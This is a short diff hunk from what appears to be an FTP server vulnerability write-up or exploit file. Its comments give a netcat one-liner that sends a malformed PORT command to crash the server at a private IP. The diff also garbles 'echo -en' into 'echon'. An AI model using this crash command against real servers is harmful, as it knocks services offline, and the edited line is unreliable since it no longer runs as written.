@@ -15,7 +15,7 @@
 # FTP commands. The following command, which sends an invalid PORT command to 
 # the FTP server, will crash the server once it is received.
 
-# echo -en "PORT\r\n" | nc -nv 192.168.2.5 50000
+# echon "PORT\r\n" | nc -nv 192.168.2.5 50000
 
 # ----------------------
 # Authentication Bypass:
